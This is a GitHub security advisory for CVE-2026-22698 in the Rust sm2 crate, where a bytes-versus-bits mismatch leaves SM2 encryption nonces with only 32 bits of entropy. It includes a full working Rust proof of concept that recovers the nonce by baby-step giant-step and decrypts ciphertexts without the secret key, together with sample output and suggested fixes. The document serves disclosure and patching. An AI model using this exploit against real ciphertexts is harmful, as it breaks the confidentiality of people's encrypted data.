# [H] SM2-PKE has 32-bit Biased Nonce Vulnerability

## Summary
Severity: High
Advisory: GHSA-w3g8-fp6j-wvqw
CVE: CVE-2026-22698
CWE: CWE-331
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-09
Source: https://github.com/advisories/GHSA-w3g8-fp6j-wvqw
Type: github-advisory

## Affected
- crates.io: `sm2` — affected >=0.14.0-pre.0

## Details
### Summary

A critical vulnerability exists in the SM2 Public Key Encryption (PKE) implementation where the ephemeral nonce `k` is generated with severely reduced entropy. A unit mismatch error causes the nonce generation function to request only 32 bits of randomness instead of the expected 256 bits. This reduces the security of the encryption from a 128-bit level to a trivial 16-bit level, allowing a practical attack to recover the nonce `k` and decrypt any ciphertext **given only the public key and ciphertext**.



### Affected Versions

- sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)
- sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)

This vulnerability is introduced in commit: [Commit 4781762](https://github.com/RustCrypto/elliptic-curves/commit/4781762f23ff22ab34763410f648128055c93731) on Sep 6, 2024, which is over a year ago.



### Details

The root cause of this vulnerability is a unit mismatch in the `encrypt` function located in `sm2/src/pke/encrypting.rs`.

1.  The code correctly calculates the byte-length of the curve order (256 bits / 8 = 32 bytes) and stores it in a constant `N_BYTES`.
    ```rust
    const N_BYTES: u32 = Sm2::ORDER.as_ref().bits().div_ceil(8); // Value is 32 (bytes)
    ```
2.  However, this `N_BYTES` value is then passed to the `next_k` helper function, which incorrectly interprets this value as a *bit length*.
    ```rust
    let k = Scalar::from_uint(&next_k(rng, N_BYTES)?).unwrap();
    ```
3.  Inside `next_k`, the `bit_length` parameter (which holds the value 32) is passed directly to `U256::try_random_bits`, a function that generates a random number with the specified number of bits.
    ```rust
    fn next_k<R: TryCryptoRng + ?Sized>(rng: &mut R, bit_length: u32) -> Result<U256> {
        let k = U256::try_random_bits(rng, bit_length).map_err(|_| Error)?;
        // ...
    }
    ```
    As a result, the ephemeral nonce `k` is generated with only 32 bits of entropy, with its upper 224 bits being zero. This catastrophic loss of randomness makes the encryption scheme insecure.
    
    

### PoC

A proof-of-concept demonstrating the feasibility of this attack is provided in `examples/bsgs_recover.rs`. The PoC performs the following steps:

1.  **Encrypt a Message**: It uses the vulnerable `EncryptingKey::encrypt` function to encrypt a sample message.
2.  **Extract Ephemeral Public Key**: It parses the ciphertext to extract `C1`, which is the ephemeral public key `[k]G`.
3.  **Recover Nonce `k`**: It runs a Baby-Step Giant-Step (BSGS) algorithm to search the reduced 2^32 search space for the nonce `k`. This attack is computationally feasible on modern hardware in seconds with time complexity `O(2^16)`.
4.  **Decrypt without Secret Key**: Once `k` is recovered, it computes the shared secret `[k]PB` (where `PB` is the recipient's public key) and successfully decrypts the ciphertext without access to the recipient's secret key.

`examples/bsgs_recover.rs`

``` rust
//! Example: Recover low-entropy nonce k via Baby-Step Giant-Step (BSGS)
//!
//! This example intentionally demonstrates an attack on the vulnerable
//! `EncryptingKey::encrypt` implementation which (in the current repository
//! state) may generate k with only 32 bits of entropy. The example:
//! - Generates a key pair and encrypts a short plaintext.
//! - Extracts C1 from the ciphertext (ephemeral public key [k]G).
//! - Runs BSGS over the reduced search space 2^32 to recover k and decrypt: time O(2^16), space O(2^16).
//!

use std::collections::HashMap;
use std::error::Error;

use rand_core::OsRng;

use sm2::{
    pke::Mode,
    pke::EncryptingKey,
    PublicKey,
    SecretKey,
    AffinePoint,
    ProjectivePoint,
    Scalar,
};
use elliptic_curve::bigint::U256;
use elliptic_curve::{Group, Curve};
use elliptic_curve::sec1::{FromEncodedPoint, ToEncodedPoint};
use sm3::{Sm3, Digest};

/// Baby-step giant-step over the 32-bit search space.
fn bsgs_recover_k(c1: &AffinePoint) -> Option<U256> {
    // search parameters
    let m: u32 = 1 << 16; // baby/giant step size -> covers 2^32 space

    // baby steps: j*G -> j
    let mut baby: HashMap<Vec<u8>, u32> = HashMap::with_capacity(m as usize + 1);
    for j in 0..m {
        let j_u256 = U256::from_u32(j);
        let s = Scalar::from_uint(&j_u256).unwrap();
        let p = ProjectivePoint::mul_by_generator(&s).to_affine();
        let ep = p.to_encoded_point(false);
        baby.insert(ep.as_bytes().to_vec(), j);
    }

    // giant steps
    for i in 0..=m {
        let im = (i as u64) * (m as u64);
        let im_u256 = U256::from_u64(im);
        let im_scalar = Scalar::from_uint(&im_u256).unwrap();
        let im_point = ProjectivePoint::mul_by_generator(&im_scalar).to_affine();

        // candidate = C1 - im_point
        let c1_proj = ProjectivePoint::from(c1);
        let im_proj = ProjectivePoint::from(&im_point);
        let candidate_proj = c1_proj + (-im_proj);
        let candidate = candidate_proj.to_affine();
        let cand_bytes = candidate.to_encoded_point(false).as_bytes().to_vec();

        if let Some(&j) = baby.get(&cand_bytes) {
            let k_recovered = im + (j as u64);
            return Some(U256::from_u64(k_recovered));
        }
    }
    None
}

/// KDF using SM3 (re-implementation of crate internal `kdf`).
fn kdf_sm3(kpb: AffinePoint, c2: &mut [u8]) {
    let mut hasher = Sm3::new();
    let klen = c2.len();
    let mut ct: u32 = 0x00000001;
    let digest_size = 32usize; // SM3 output is 32 bytes
    let mut ha = vec![0u8; digest_size];
    let encode_point = kpb.to_encoded_point(false);

    let mut offset = 0usize;
    while offset < klen {
        hasher.update(encode_point.x().unwrap());
        hasher.update(encode_point.y().unwrap());
        hasher.update(&ct.to_be_bytes());
        let out = hasher.finalize_reset();
        ha.copy_from_slice(out.as_slice());

        let xor_len = core::cmp::min(digest_size, klen - offset);
        for i in 0..xor_len {
            c2[offset + i] ^= ha[i];
        }
        offset += xor_len;
        ct = ct.wrapping_add(1);
    }
}

/// Decrypt ciphertext given recovered k and recipient public key (without secret key).
fn decrypt_with_k(pubkey: &PublicKey, k: U256, ciphertext: &[u8], mode: Mode) -> Result<Vec<u8>, Box<dyn Error>> {
    // parse c1
    let n_bytes = sm2::Sm2::ORDER.as_ref().bits().div_ceil(8) as usize; // 32
    let c1_len = n_bytes * 2 + 1;
    if ciphertext.len() < c1_len {
        return Err("ciphertext too short".into());
    }
    let (_c1_bytes, rest) = ciphertext.split_at(c1_len);

    // derive shared point hpb = [h*k]PB; for SM2 cofactor h == 1 so this is [k]PB
    let pb_affine = pubkey.as_affine();
    let k_scalar = Scalar::from_uint(&k).unwrap();
    let s = *pb_affine; // cofactor h == 1
    let hpb = (s * k_scalar).to_affine();

    // split rest into c2 and c3 depending on mode
    let digest_size = 32usize; // SM3 output size
    let (c2_slice, c3_slice) = match mode {
        Mode::C1C2C3 => {
            let c2_len = rest.len() - digest_size;
            rest.split_at(c2_len)
        }
        Mode::C1C3C2 => {
            let (c3, c2) = rest.split_at(digest_size);
            (c2, c3)
        }
    };

    let mut c2 = c2_slice.to_owned();
    // KDF to recover plaintext
    kdf_sm3(hpb, &mut c2);

    // verify c3
    let mut check = Sm3::new();
    let enc = hpb.to_encoded_point(false);
    check.update(enc.x().unwrap());
    check.update(&c2);
    check.update(enc.y().unwrap());
    let out = check.finalize_reset();
    if out.as_slice() != c3_slice {
        return Err("c3 verification failed".into());
    }

    Ok(c2)
}

/// High-level: given ciphertext and recipient public key, recover k via BSGS and decrypt.
fn recover_and_decrypt(pubkey: &PublicKey, ciphertext: &[u8], mode: Mode) -> Result<Vec<u8>, Box<dyn Error>> {
    // extract C1
    let n_bytes = sm2::Sm2::ORDER.as_ref().bits().div_ceil(8) as usize; // 32
    let c1_len = n_bytes * 2 + 1;
    let (c1_bytes, _rest) = ciphertext.split_at(c1_len);
    let encoded = sm2::EncodedPoint::from_bytes(c1_bytes)?;
    let c1_affine = AffinePoint::from_encoded_point(&encoded).unwrap();

    if let Some(k) = bsgs_recover_k(&c1_affine) {
        println!("recovered k = 0x{:x}", k);
        let plain = decrypt_with_k(pubkey, k, ciphertext, mode)?;
        return Ok(plain);
    }
    Err("failed to recover k".into())
}

fn main() -> Result<(), Box<dyn Error>> {
    // demo: generate keypair, encrypt, then recover and decrypt without secret key
    let mut rng = OsRng;
    let sk = SecretKey::try_from_rng(&mut rng)?;
    let pk = sk.public_key();
    let ek = EncryptingKey::new_with_mode(pk, Mode::C1C2C3);
    let msg = b"attack-demo-sm2-bsgs-recover-example";
    let ct = ek.encrypt(&mut rng, msg)?;
    print!("Trying to recover k and decrypt...\n");
    let recovered = recover_and_decrypt(&pk, &ct, Mode::C1C2C3)?;
    println!("recovered plaintext: {}", std::str::from_utf8(&recovered)?);
    Ok(())
}

```

To run the PoC (tested on Apple M3): 

```bash
$ time cargo run --example bsgs_recover 
Trying to recover k and decrypt...
recovered k = 0x00000000000000000000000000000000000000000000000000000000ca4f2d79
recovered plaintext: attack-demo-sm2-bsgs-recover-example
cargo run --example bsgs_recover  14.44s user 0.13s system 89% cpu 16.266 total
```



### Impact

This vulnerability leads to a complete loss of confidentiality for all data encrypted using the SM2 PKE implementation in this library. Any attacker who obtains a ciphertext can recover the plaintext in a feasible amount of time (several seconds).

The severity is **Critical**, as it breaks the core security promise of the public key encryption scheme. All versions of the `sm2` crate with the vulnerable PKE implementation are affected. 

- Fix 1: Modify the input parameter to the correct 256 bits

  ``` rust
  let k_uint = next_k(rng, N_BYTES * 8)?;
  ```

- Fix 2: We believe that the `next_k` function should only generate a 256-bit nonce to ensure security, therefore the parameter is unnecessary.

  ``` rust
  fn next_k<R: TryCryptoRng + ?Sized>(rng: &mut R) -> Result<U256> {
      loop {
          let k = U256::try_random_bits(rng, 256).map_err(|_| Error)?;
          if !bool::from(k.is_zero()) && k < *Sm2::ORDER {
              return Ok(k);
          }
      }
  }
  ```

  

### Credit

This vulnerability was discovered by:

- XlabAI Team of Tencent Xuanwu Lab
- Atuin Automated Vulnerability Discovery Engine

CVE and credit are preferred.

If developers have any questions regarding the vulnerability details, please feel free to reach out for further discussion via email at  xlabai@tencent.com.



### Note

SM2 follows the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, the organization reserves the right to publicly disclose all information about the issues after this timeframe.

## References
- https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-w3g8-fp6j-wvqw
- https://nvd.nist.gov/vuln/detail/CVE-2026-22698
- https://github.com/RustCrypto/elliptic-curves/pull/1600
- https://github.com/RustCrypto/elliptic-curves/commit/4781762f23ff22ab34763410f648128055c93731
- https://github.com/RustCrypto/elliptic-curves/commit/e4f77788130d065d760e57fb109370827110a525
- https://crates.io/crates/sm2/0.14.0-pre.0
- https://crates.io/crates/sm2/0.14.0-rc.0
- https://github.com/RustCrypto/elliptic-curves
